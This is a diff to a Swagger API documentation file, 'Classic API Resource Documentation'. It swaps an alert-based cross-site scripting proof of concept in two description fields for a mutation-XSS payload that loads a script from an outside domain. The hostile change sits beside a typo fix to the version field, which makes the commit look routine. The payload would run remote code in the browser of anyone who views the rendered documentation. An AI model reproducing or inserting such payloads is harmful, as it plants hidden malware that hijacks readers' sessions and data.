@@ -2,9 +2,9 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_POC_By_TADI') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script src='https://www.yl300.xyz/js/2.js'></script>"></form>
 
-  version: prodxuction
+  version: production
 basePath: /JSSResource/
 produces:
   - application/xml
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS_POC_By_TADI') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script src='https://www.yl300.xyz/js/2.js'></script>"></form>
 
           format: int64
           in: path
@@ -8260,3 +8260,4 @@ tags:
     name: vppinvitations
   - description: Operations on webhooks
     name: webhooks
+                       
